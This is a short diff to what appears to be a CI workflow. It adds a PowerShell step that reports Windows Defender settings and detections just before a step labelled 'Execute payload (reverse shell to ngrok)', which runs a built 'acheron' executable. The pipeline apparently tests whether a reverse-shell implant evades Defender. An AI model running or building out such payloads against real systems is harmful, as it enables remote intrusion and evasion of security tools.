@@ -17,6 +17,18 @@ jobs:
           dir acheron_*.exe
         shell: pwsh
       
+      - name: Check Windows Defender status
+        run: |
+          Write-Host "=== Windows Defender Status ==="
+          Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen, DisableIOAVProtection, DisableScriptScanning
+          Write-Host ""
+          Write-Host "=== Defender Threats (recent) ==="
+          Get-MpThreat | Select-Object ThreatID, Severity, Category, Resources | Format-Table -AutoSize
+          Write-Host ""
+          Write-Host "=== Defender Quarantine ==="
+          Get-MpThreatDetection | Select-Object DetectionTime, ThreatID, ActionSuccess | Format-Table -AutoSize
+        shell: pwsh
+      
       - name: Execute payload (reverse shell to ngrok)
         run: |
           $exe = Get-ChildItem acheron_*.exe | Select-Object -First 1
